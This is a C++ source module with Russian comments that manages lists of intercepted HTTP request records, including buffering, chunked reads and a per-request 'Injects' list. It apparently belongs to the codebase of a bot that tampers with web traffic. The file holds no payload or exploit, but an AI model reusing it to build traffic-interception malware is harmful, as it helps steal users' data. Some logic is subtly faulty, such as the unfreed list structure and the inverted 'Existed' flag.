//---------------------------------------------------------------------------

#include "Requests.h"
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "BotClasses.h"

//---------------------------------------------------------------------------
void FreeRequest(PRequest R);

PRequestList Request::CreateList(TRequestEvent OnInitExtData, TRequestEvent OnFreeExtData)
{
	// Создаёт список запросов
	PRequestList List = CreateStruct(TRequestList);
	if (List == NULL)
		return NULL;

	List->Lock = CreateStruct(RTL_CRITICAL_SECTION);
    pInitializeCriticalSection(List->Lock);
	List->Items = List::Create();
	List::SetFreeItemMehod(List->Items, (TFreeItemMethod)FreeRequest);
	List::SetCapacity(List->Items, 128);
	List->OnInitializeExtData = OnInitExtData;
	List->OnFreeExtData = OnFreeExtData;

    return List;
}
//---------------------------------------------------------------------------

void Request::FreeList(PRequestList List)
{
	// Уничтожить список запросов
	if (List == NULL)
		return;
	List::Free(List->Items);
	pDeleteCriticalSection(List->Lock);
    FreeStruct(List->Lock);
}

//---------------------------------------------------------------------------

void FreeRequest(PRequest R)
{
	// Уничтожаем запрос

	Request::Clear(R);
	FreeStruct(R);
}

void Request::Clear(PRequest R)
{
	// Очистить запрос

	if (R->List->OnFreeExtData != NULL)
		R->List->OnFreeExtData(R);

	// Уничтожаем данные

	R->Method = hmUnknown;
	STR::Free(R->URL);
	STR::Free(R->Optional);
	STR::Free(R->ContentType);

	if (R->Buffer != NULL)
		MemFree(R->Buffer);

	if (R->Injects != NULL)
		List::Free(R->Injects);

	if (R->ReceiveBuf != NULL)
		MEMBLOCK::FreeBlock(R->ReceiveBuf);

	if (R->ReceiveList != NULL)
		MEMBLOCK::FreeList(R->ReceiveList);

	//  Сохраняем обязательные данные
	LPVOID OldOwner = R->Owner;
	PRequestList OldList =  R->List;

	// Очищаем структуру
	m_memset(R, 0, sizeof(TRequest));

	// Восстанавливаем обязательные данные
	R->Owner = OldOwner;
    R->List = OldList;
}

//---------------------------------------------------------------------------

PRequest Request::Find(PRequestList List, LPVOID Owner)
{

	// Найти запрос для владельца
	if (List == NULL)
		return NULL;
	Request::Lock(List);
    PRequest Result = NULL;
	DWORD Count = List::Count(List->Items);
	for (DWORD i = 0; i < Count; i++)
	{
		PRequest R = (PRequest)List::GetItem(List->Items, i);
		if (R->Owner == Owner)
		{
			Result = R;
			break;
        }
	}

	Request::Unlock(List);
	return Result;
}
//---------------------------------------------------------------------------

PRequest Request::Add(PRequestList List, LPVOID Owner, bool *Existed)
{
	// Добавить запрос. Если запрос для владельца Owner существует, то будет
	// возвращён указатель на него
	if (List == NULL)
		return NULL;

	Request::Lock(List);

	PRequest R = Request::Find(List, Owner);
	if (R == NULL)
	{
		// Запрос отсутствует. Добавляем
		R = CreateStruct(TRequest);
		if (Existed != NULL)
			*Existed = R != NULL;

		if (R != NULL)
		{
			List::Add(List->Items, R);
			R->Owner = Owner;
			R->List = List;
			if (List->OnInitializeExtData != NULL)
				List->OnInitializeExtData(R);
		}

	}
	Request::Unlock(List);
	return R;
}
//---------------------------------------------------------------------------

DWORD Request::Delete(PRequestList List, LPVOID Owner)
{
	// Удалить запрос
	if (List == NULL)
		return false;
	Request::Lock(List);

	DWORD Count = List::Count(List->Items);
	DWORD i;
	PRequest R;
	DWORD Res = 0;
	for (i = 0; i < Count; i++)
	{
		R = (PRequest)List::GetItem(List->Items, i);
		if (R->Owner == Owner)
		{
			Res = (DWORD)R;
			List::Delete(List->Items, i);
			break;
        }
	}
	Request::Unlock(List);
	return Res;
}
//---------------------------------------------------------------------------

DWORD RequestDoGetNextDataPart(PRequest Request, LPVOID Buf, DWORD BufSize, bool FreeBuf)
{
	// Получить следующую порцию данных

	if (Request == NULL || Request->Buffer == NULL)
		return 0;

	int Max = Request->BufferSize - Request->Position;
	if (Max < 0)
		Max = 0;
	// Если не указан буфер или размер буфера, то возвращаем
	// объём доступных данных
	if (Buf == NULL || BufSize == 0)
		return Max;

	// Больше нет данных
	if (Max > 0)
	{
		// Выдаём данные
		if ((DWORD)Max > BufSize)
			Max = BufSize;
		m_memcpy(Buf, (PCHAR)Request->Buffer + Request->Position, Max);
		Request->Position += Max;

		Request->SaveReturned += Max;
	}

	if (Request->Position >= Request->BufferSize  && FreeBuf)
		Request::SetBuffer(Request, NULL, 0);

	return Max;
}

//---------------------------------------------------------------------------

DWORD Request::GetNextDataPart(PRequest Request, LPVOID Buf, DWORD BufSize, bool FreeBuf)
{
	// Получить следующую порцию данных

	if (Request == NULL)
		return 0;

	//Lock(Request->List);

	DWORD Result = RequestDoGetNextDataPart(Request, Buf, BufSize, FreeBuf);

	//Unlock(Request->List);

    return Result;
}
//---------------------------------------------------------------------------


void inline Request::Lock(PRequestList List)
{
	if (List != NULL)
		pEnterCriticalSection(List->Lock);
}

void inline Request::Unlock(PRequestList List)
{
	if (List != NULL)
		pLeaveCriticalSection(List->Lock);
}

void Request::SetBuffer(PRequest R, LPBYTE NewBuf, DWORD Size)
{
	DWORD OldPosition = R->Position;

	if (R->Buffer != NULL)
		MemFree(R->Buffer);

	R->Position = 0;
	R->Buffer = NewBuf;
	R->BufferSize = Size;

	if (NewBuf != NULL && Size == 0)
		R->BufferSize = StrCalcLength((PCHAR)NewBuf);

	if (R->BufferSize != 0)
		R->SavedSize = R->BufferSize;
}


//----------------------------------------------------------------------------
//  Request - Набор функция для работы с запросами
//----------------------------------------------------------------------------

void Request::InitializeReceiveData(PRequest R)
{
	// Инициализировать данные для загрузки документа
	if (R == NULL) return;

	if (R->ReceiveList == NULL)
		R->ReceiveList = MEMBLOCK::CreateList();

	if (R->ReceiveBuf == NULL)
	{
		PMemBlock B = CreateStruct(TMemBlock);
		B->Size = 4096;
		B->Data = MemAlloc(B->Size);
        R->ReceiveBuf = B;
    }
}

void Request::CloseReceiveData(PRequest R)
{
	// функция собирает загруженные данные ф буфер запроса
	// и освобождает выделенные для загрузки структуры
	if (R == NULL) return;
	MEMBLOCK::FreeBlock(R->ReceiveBuf);
	R->ReceiveBuf = NULL;

	// Собираем загруженные данные
	if (R->ReceiveList != NULL)
	{
		DWORD Sz;
		LPVOID Buf = MEMBLOCK::BuildAsMem(R->ReceiveList, &Sz);
		Request::SetBuffer(R, (LPBYTE)Buf, Sz);

		MEMBLOCK::FreeList(R->ReceiveList);
		R->ReceiveList = NULL;
    }

}


// Метод перебора всех запросов списка
void Request::EnumRequests(PRequestList Requests, TRequestEnumMethod Method, LPVOID Data)
{
	if (Requests == NULL || Method == NULL)
		return;

	Lock(Requests);

	DWORD Count = List::Count(Requests->Items);

	for (DWORD i = 0; i < Count; i++)
	{
		PRequest Request = (PRequest)List::GetItem(Requests->Items, i);
		if (!Method(Request, Data))
        	break;
	}

	Unlock(Requests);
}


